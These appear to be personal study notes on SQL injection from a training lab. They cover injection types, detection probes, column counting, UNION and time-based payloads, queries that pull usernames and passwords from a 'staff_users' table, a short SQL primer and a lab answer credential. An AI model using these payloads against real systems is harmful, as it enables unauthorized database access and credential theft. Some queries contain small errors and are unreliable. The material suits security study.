# Information

# SQLi
	- Leads to unauthorized access to database.
	- Can be escalated to RCE,DOS.
	- Successful SQLi can lead to persistent backdoor in organization.

# Methods
	1. Retrieving hidden data: Get extra information from current database.
	2. Union Attacks: Get information from other database.
	3. Examining Database: Get current version of database.
	4. Subverting Application Logic: 

# Types of SQL Injection

	1. In-BOund SQL Injection
		a. Data is reflected in the same page, when we enter any values in parameter.
		b. For eg: In username parameter if we enter any injection, it would be reflected somewhere in the page where username is reflected.

	2. Error based SQL Injection
		a. If there is no reflection of any parameter values on page, lets go for error based sql injection.
		b. If we inject any query into parameters, page will throw us an error.

	3. Union Based SQL Injection\
		a. This injection method, will utilize UNION command which combines one table with another, any prints the output.
		b. How can we detect Union Based SQL Injection
			1. Using ORDER BY clause. If we have a where clause like where ID = 2 or something like that we can use ORDERY BY clause there.
				a. ' ORDER BY 1 ' ORDER BY 2 'ORDER BY 3
				b. Try to order by different columns and check if you recieve any error, we can specify index name ... so no need to specify column name.
			2. Using UNION Clause with NULL Values.
				a. ' UNION SELECT NULL; 'UNION SELECT NULL,NULL; ' UNION SELECT NULL,NULL,NULL;
				b. When number of nulls matches number of columns it might throw us additional row or null point exception error.

	4. Blind SQL Injection
		a. When we don't recieve any output or just some minor tweaks are there in response.
		b. Authentication bypass
			1. Most common Blind sql injection because we don't want to see usernames or passwords.
			2. We just want to pass login forms
			3. Common SQL Injection - ' OR 1=1 --; '--
		c. Boolean based: In this, output would be binary. So if username is not available returns false then try UNION statement which is like OR, if admin123 username returns false, then union that with available columns, at one point it will return true, which means false OR true => true . After finding columns try to manipulate to return databases, columns and tables.
		d. Time Based: In this there is no binary output nor we can verify if our statement is working, so this time we use sleep(x) function or similar, which will delay the response. For eg: admin' UNION select 1,sleep(5);-- If this returns response after a 5second delay that means its working, after this follow similar steps like boolean based, since now we know there are total two columns.

# Phases

# Fingerprinting
	1. Inspecting HTTP Headers in response(PHP, MYSQL VERISON, or any specific tech stack version used)
	2. Getting directories names from ffuf, or any other tool
	3. 

# Detecting SQL Injection

	1. Lets start with Error based SQL Injection by inserting few characters.
		a. '
		b. "
		c. `(Tilda Character)`

	2. Detection based on Integer
		1. When detecting sql injection on integer based parameters, try to use addition,multiplication,subtraction.
		2. For eg: article/?id=2 => article/?id=2-1 Will this fetch 1st article?

	3. Detection based on Strings
		1. If /?user=test is the given parameter, try to inject single quotes after test.
		2. test' see if error is produced, try to use double single quotes, now if error is not produced.
		3. if there are two paramters in url, there might be paranthesis in sql query
			a. For Eg: /?user=test&id=4 , sql query might be where ( user = test & id = 4 )
			b. We can use one or more paranthesis with single quote after test.
			c. Or we can check if we insert some more injection will that return same results ??? 
			d. for eg: test' & '1'='1 => ( user = test' & '1'='1' & id = 4 )
			e. This will give same result ?? Now try this test' & '0'='1 => Error so we have found SQL injection on this parameter. Now comes exploitation phase.

# Exploitation of SQL injection
	1. After inspecting parameters where injection is reflected we need to Detect number of columns for Union based sql injection 
		a. ORDER BY 1 ORDER BY 1,2 ... If at any point this query throws error, that means there are X-1 number of columns.(Where X is the column number which thrown error)
		b. UNION SELECT 1,2,3 ... Can also detect how many columns are there.

	2. When we want to retrieve any information, if its a string based info, we need to find a column which is compatible with string based datatype. Therefore, we need to trial&test all columns, if they can fit in string.FOr eg: union select null,database(),null...union select database(),null,null...union select null,null,database()

	3. This works for MySQL the methodology is different for other databases, the values 1,2,3,... should be changed to null,null,null, ... for database that need the same type of value in the 2 sides of the UNION keyword. For Oracle, when SELECT is used the keyword FROM needs to be used, the table dual can be used to complete the request: UNION SELECT null,null,null FROM dual

	4. Retrieve Information
		a. current_user() => http://vulnerable/cat.php?id=1%20UNION%20SELECT%201,current_user(),3,4
		b. version() =>  http://vulnerable/cat.php?id=1%20UNION%20SELECT%201,@@version,3,4 => Here @@version is used, remember this.
		c. database()  => http://vulnerable/cat.php?id=1%20UNION%20SELECT%201,database(),3,4
		d. When retrieving information, keep number of columns same in UNION statement, insert your version() payload in all columns and check where its reflected in response.

# Process

# Process during In-Bound SQL Injection with blog parameter vulnerable to sql injection

	- select * from article where id = 0 UNION select 1,2,group_concat(table_name) from INFORMATION_SCHEMA.tables where table_schema='sqli_one'
	- select * from article where id = 0 UNION select 1,2,group_concat(column_name) from INFORMATION_SCHEMA.columns where column_name='staff_users'
	- select * from article where id = 0 UNION select 1,2,group_concat(usernames, ':', password SEPARATOR '<br>') from staff_users


# SQL Tutorial
	-- SQL is not case sensitive for commands, but case sensitive when creating database names
	CREATE DATABASE testDB;

	-- How to check current Database name
	SELECT DB_NAME(); -- This is query
	db_name() -- This is in terminal ...  Not tried yet.

	-- .bak extension tells the backup db name extension
	BACKUP DATABASE testDB
	to DISK = 'D:/';

	-- Incase of Differential Backup
	BACKUP DATABASE testDB
	to DISK = 'D:/'
	with DIFFERENTIAL;

	## SQL Statements
	select * from users where username == 'admin';
	select * from users where username like '%n';
		- This ensures usernames which ends with n
		- like can have % at start,end or in middle. like %n returns admin,john,etc. like a% returns admin,adi,etc. like %mi% returns admin,amiy,etc.
	select age,customer from users UNION select day,products from shop;
		- UNION will only work if we have same number of columns on both tables.
	insert into tablename (username,password) values (admin,123);
	update users set username='root',password='123' where username='admin';
	delete from users where username='admin';
		- delete from users; will delete all rows from users table.

# SOLutions
	martin => pa$$word